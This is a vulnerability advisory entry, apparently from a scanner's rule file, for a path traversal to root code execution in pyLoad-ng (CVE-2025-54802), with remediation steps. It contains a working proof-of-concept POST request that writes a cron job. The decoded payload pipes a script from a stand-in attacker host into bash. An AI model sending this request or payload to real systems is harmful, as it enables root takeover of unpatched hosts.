info:
  name: pyload-ng
  cve: CVE-2025-54802
  summary: Path Traversal in pyLoad-ng CNL Blueprint leads to Remote Code Execution (RCE)
  details: |
    The `addcrypted` endpoint in `pyload-ng` is vulnerable to a path traversal issue via the `package` parameter, allowing unauthenticated attackers to write arbitrary files outside the intended directory. The vulnerability exists due to improper sanitization of user-supplied input in the construction of `dlc_path`. This can be exploited to overwrite critical system files such as cron jobs or systemd services.
    #### Vulnerable Code Snippet:
    ```python
    dlc_path = os.path.join(
        dl_path, package.replace("/", "").replace("\\", "").replace(":", "") + ".dlc"
    )
    ```
    #### Proof of Concept (PoC):
    An attacker can send a crafted POST request to `/addcrypted`, writing a malicious cron job:
    ```http
    POST /addcrypted HTTP/1.1
    Host: localhost:8000
    Content-Type: application/x-www-form-urlencoded
    package=../../../../etc/cron.d/payload&crypted=KioqICogKiAqKiByb290IGN1cmwgLXMgaHR0cDovL2F0dGFja2VyLmNvbS9yLnNoIHwgYmFzaA==
    ```
    Decoded payload:
    ```bash
    * * * * * root curl -s http://attacker.com/r.sh | bash
    ```
    This results in remote code execution with **root privileges**, making it a severe system compromise vector.
  cvss: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  severity: CRITICAL
  security_advise: |
    1. Upgrade to version `pyload-ng >= 0.5.0b3.dev90`.
    2. Apply input validation and restrict file paths strictly within allowed directories.
    3. Monitor systems for unauthorized cron job modifications or suspicious payloads.
rule: version >= "0" && version < "0.5.0b3.dev90"
references:
  - https://github.com/pyload/pyload/security/advisories/GHSA-48rp-jc79-2264
  - https://nvd.nist.gov/vuln/detail/CVE-2025-54802
  - https://github.com/pyload/pyload/pull/4596
  - https://github.com/pyload/pyload/commit/70a44fe02c03bce92337b5d370d2a45caa4de3d4
  - https://github.com/pyload/pyload